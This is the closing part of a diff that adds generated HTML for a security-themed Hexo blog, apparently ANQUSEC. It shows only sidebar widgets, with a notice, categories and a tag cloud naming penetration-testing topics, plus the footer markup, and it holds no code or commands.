+      <div class="count-box--item">
+        <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
+</svg>
+        15
+      </div>
+    </div>
+  </div>
+</section>
+
+      
+
+      
+<section class="widet-notice widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-notice" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M512 945.02305225v28.15620663a24.27259221 24.27259221 0 0 1-24.27259221 24.27259335H394.0352a48.54518557 48.54518557 0 0 1-41.74885888-23.78714112l-110.68302222-184.47170332a132.04290333 132.04290333 0 0 1-17.47626667-48.54518557h118.4502511a200.97706667 200.97706667 0 0 1 76.21594113 14.56355556l20.38897777 133.49925888a48.54518557 48.54518557 0 0 0 36.40888888 27.67075555l16.01991111 2.91271112a24.27259221 24.27259221 0 0 1 20.38897778 25.72894889zM997.45185223 463.45481443a194.18074112 194.18074112 0 0 1-38.8361489 116.50844445 24.75804445 24.75804445 0 0 1-36.4088889 0l-34.95253333-34.95253333a24.27259221 24.27259221 0 0 1-2.91271111-30.58346667 97.09036999 97.09036999 0 0 0 0-106.79940665 24.27259221 24.27259221 0 0 1 2.91271111-30.58346666l34.95253333-34.95253334a24.75804445 24.75804445 0 0 1 18.93262223-7.28177777 26.2144 26.2144 0 0 1 17.47626667 9.70903665A194.18074112 194.18074112 0 0 1 997.45185223 463.45481443z m-194.18074112-388.36148111v776.72296335a48.54518557 48.54518557 0 0 1-48.54518556 48.54518443h-28.64165888a48.54518557 48.54518557 0 0 1-33.98163001-14.07810332l-145.63555556-143.20829668A291.27111111 291.27111111 0 0 0 342.57730333 657.63555556H172.18370333a145.63555556 145.63555556 0 0 1-145.63555556-145.63555556v-97.09036999a145.63555556 145.63555556 0 0 1 145.63555556-145.63555556h170.3936a291.27111111 291.27111111 0 0 0 206.31703779-85.43952668l145.63555555-143.20829554a48.54518557 48.54518557 0 0 1 33.98162888-14.07810446H754.72592555a48.54518557 48.54518557 0 0 1 48.54518556 48.54518555z" fill="currentColor"></path>
+</svg>
+    <span>NOTICE</span>
+  </div>
+  <div class="widget-body">
+    <p>TG讨论群：https://t.me/APT360</p>
+  </div>
+</section>
+
+
+      <section class="widget-categorys widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
+</svg>
+    <span>CATEGORYS</span>
+  </div>
+  <div class="widget-body">
+    <ul class="categorys-list">
+      
+        <li class="categorys-list-item">
+          <a href="/categories/%E5%B7%A5%E5%85%B7/">
+            工具 (3)
+          </a>
+        </li>
+      
+        <li class="categorys-list-item">
+          <a href="/categories/%E6%BC%8F%E6%B4%9E/">
+            漏洞 (1)
+          </a>
+        </li>
+      
+        <li class="categorys-list-item">
+          <a href="/categories/%E5%AE%89%E5%8D%93%E6%B8%97%E9%80%8F/">
+            安卓渗透 (1)
+          </a>
+        </li>
+      
+        <li class="categorys-list-item">
+          <a href="/categories/%E6%BA%90%E4%BB%A3%E7%A0%81/">
+            源代码 (1)
+          </a>
+        </li>
+      
+        <li class="categorys-list-item">
+          <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+            渗透测试 (3)
+          </a>
+        </li>
+      
+        <li class="categorys-list-item">
+          <a href="/categories/%E9%98%B2%E7%81%AB%E5%A2%99/">
+            防火墙 (1)
+          </a>
+        </li>
+      
+        <li class="categorys-list-item">
+          <a href="/categories/%E6%9A%97%E7%BD%91/">
+            暗网 (1)
+          </a>
+        </li>
+      
+        <li class="categorys-list-item">
+          <a href="/categories/Nday/">
+            Nday (1)
+          </a>
+        </li>
+      
+        <li class="categorys-list-item">
+          <a href="/categories/%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6/">
+            敏感文件 (1)
+          </a>
+        </li>
+      
+        <li class="categorys-list-item">
+          <a href="/categories/%E8%B7%91%E8%B7%AF/">
+            跑路 (1)
+          </a>
+        </li>
+      
+        <li class="categorys-list-item">
+          <a href="/categories/%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F/">
+            实战渗透 (1)
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+</section>
+
+      <section class="widget-tags widget-item  layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
+</svg>
+    <span>TAGS</span>
+  </div>
+  <div class="widget-body">
+    <div class="tags-cloud">
+      <a href="/tags/APT/" style="font-size: 10px;" class="tags-cloud-0">APT</a> <a href="/tags/SHELL%E7%BC%96%E7%A8%8B/" style="font-size: 10px;" class="tags-cloud-0">SHELL编程</a> <a href="/tags/WAF%E7%BB%95%E8%BF%87/" style="font-size: 10px;" class="tags-cloud-0">WAF绕过</a> <a href="/tags/%E5%AE%89%E5%8D%93%E6%B8%97%E9%80%8F/" style="font-size: 10px;" class="tags-cloud-0">安卓渗透</a> <a href="/tags/%E5%AE%9E%E6%88%98/" style="font-size: 15px;" class="tags-cloud-5">实战</a> <a href="/tags/%E6%80%9D%E8%B7%AF/" style="font-size: 10px;" class="tags-cloud-0">思路</a> <a href="/tags/%E6%9A%97%E7%BD%91/" style="font-size: 10px;" class="tags-cloud-0">暗网</a> <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 20px;" class="tags-cloud-10">渗透测试</a> <a href="/tags/%E6%BA%90%E4%BB%A3%E7%A0%81/" style="font-size: 10px;" class="tags-cloud-0">源代码</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" style="font-size: 10px;" class="tags-cloud-0">漏洞利用</a> <a href="/tags/%E7%BA%A2%E5%A4%B4/" style="font-size: 10px;" class="tags-cloud-0">红头</a> <a href="/tags/%E7%BD%91%E5%9D%80/" style="font-size: 10px;" class="tags-cloud-0">网址</a> <a href="/tags/%E8%B7%91%E8%B7%AF/" style="font-size: 10px;" class="tags-cloud-0">跑路</a> <a href="/tags/%E9%80%83%E9%80%B8/" style="font-size: 10px;" class="tags-cloud-0">逃逸</a> <a href="/tags/%E9%83%A8%E7%BD%B2/" style="font-size: 10px;" class="tags-cloud-0">部署</a>
+    </div>
+  </div>
+</section>
+    </div>
+  </article>
+</div>
+
+    <!-- footer container -->
+<footer id="footer" class="footer">
+  <div class="footer-container">
+    
+    <div class="social-icons">
+      
+        
+      
+        
+      
+        
+      
+        
+          <a href="https://github.com/ANQUSEC" class="soft-size--primary soft-style--box" target="_blank" rel="noopener noreferrer">
+            <svg class="icon icon-github" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M64.6 512c0 195.6 125.4 361.9 300.1 422.9 23.5 5.9 19.9-10.8 19.9-22.2v-77.6c-135.8 15.9-141.3-74-150.5-89-18.5-31.5-61.9-39.5-49-54.5 31-15.9 62.5 4 98.9 58 26.4 39.1 77.9 32.5 104.1 26 5.7-23.5 17.9-44.5 34.7-60.9-140.7-25.2-199.4-111.1-199.4-213.3 0-49.5 16.4-95.1 48.4-131.8-20.4-60.6 1.9-112.4 4.9-120.1 58.2-5.2 118.5 41.6 123.3 45.3 33.1-8.9 70.8-13.7 112.9-13.7 42.4 0 80.3 4.9 113.5 13.9 11.3-8.6 67.3-48.8 121.4-43.9 2.9 7.7 24.7 58.3 5.5 118.1 32.5 36.8 49 82.8 49 132.4 0 102.3-59 188.3-200.2 213.2 23.5 23.3 38.1 55.5 38.1 91.1v112.7c0.8 9 0 17.9 15.1 17.9C832.7 877 960.4 709.4 960.4 512.1c0-247.5-200.6-447.9-447.9-447.9C265 64.1 64.6 264.5 64.6 512z"></path>
+</svg>
+          </a>
+        
+      
+        
+      
+    </div>
+     
+    <p>&copy; 2021 <a href="/" target="_blank">ANQUSEC</a></p>
+
+    
+      <p><a href="https://beian.miit.gov.cn" target="_blank">中国国家安全局</a></p>
+    
+
+    <p>Powered by <a href="https://hexo.io" target="_blank" rel="noopener noreferrer">Hexo</a> Theme - <a href="https://github.com/miiiku/flex-block" target="_blank" rel="noopener noreferrer author">flex-block</a></p>
+
+    <p>
+      <a href="javascript:;" id="theme-light">🌞 浅色</a>
+      <a href="javascript:;" id="theme-dark">🌛 深色</a>
+      <a href="javascript:;" id="theme-auto">🤖️ 自动</a>
+    </p>
+  </div>
+</footer>
+  </div>
+
+  <div class="back-to-top-fixed soft-size--round soft-style--box">
+    <svg class="icon icon-back-to-top" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+      <path d="M725.333333 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8l-213.333333-213.333333c-17.066667-17.066667-17.066667-42.666667 0-59.733333s42.666667-17.066667 59.733333 0l213.333333 213.333333c17.066667 17.066667 17.066667 42.666667 0 59.733333C746.666667 422.4 738.133333 426.666667 725.333333 426.666667z"></path>
+      <path d="M298.666667 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8-17.066667-17.066667-17.066667-42.666667 0-59.733333l213.333333-213.333333c17.066667-17.066667 42.666667-17.066667 59.733333 0s17.066667 42.666667 0 59.733333l-213.333333 213.333333C320 422.4 311.466667 426.666667 298.666667 426.666667z"></path>
+      <path d="M512 896c-25.6 0-42.666667-17.066667-42.666667-42.666667L469.333333 170.666667c0-25.6 17.066667-42.666667 42.666667-42.666667s42.666667 17.066667 42.666667 42.666667l0 682.666667C554.666667 878.933333 537.6 896 512 896z"></path>
+    </svg>
+  </div>
+
+  
+  <!-- aplayer -->
+
+
+<!-- dplayer -->
+
+
+
+
+  
+
+
+  
+
+
+  
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+  <!-- 尾部用户自定义相关内容 -->
+</body>
+</html>
